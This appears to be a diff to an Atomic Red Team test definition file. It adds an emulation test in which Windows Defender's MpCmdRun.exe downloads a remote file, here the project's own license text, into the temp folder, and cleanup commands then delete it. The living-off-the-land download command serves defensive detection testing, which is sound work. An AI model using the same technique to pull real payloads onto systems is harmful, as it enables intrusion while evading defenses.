@@ -298,4 +298,29 @@ atomic_tests:
       del C:\\svchost.exe >nul 2>&1
     name: command_prompt
     elevation_required: true
-
+- name: MpCmdRun DownloadFile
+  description: LOLB to download a file using Windows Defender that will put Atomic-license.txt in temp directory using this version 4.18.2007.8-0
+  supported_platforms:
+  - windows
+  input_arguments:
+    local_path:
+      description: Local path to place file
+      type: String
+      default: '%temp%\Atomic-license.txt'
+    remote_file:
+      description: URL of file to copy
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Must have Specific Versions and this just tests for one of them
+    prereq_command: "if ((Test-Path \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\") -or (Test-Path \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.9\") -or (Test-Path \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2009.9\")) {Write-Host \"You Got one of the versions\" -fore green} else {Write-Host \"You Don't have it\" -fore red}\n		 \n		 "
+    get_prereq_command: Write-Host "If You Don't have this version 4.18.2007.8-0 you can't run this atomic-test without manually changing to the other versions" -fore green
+  executor:
+    command: |-
+      cd %temp%
+      "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" -DownloadFile -url #{remote_file} -path #{local_path}
+    cleanup_command: |-
+      del #{local_path} >nul 2>&1
+      del %temp%\MpCmdRun.log >nul 2>&1
+    name: command_prompt
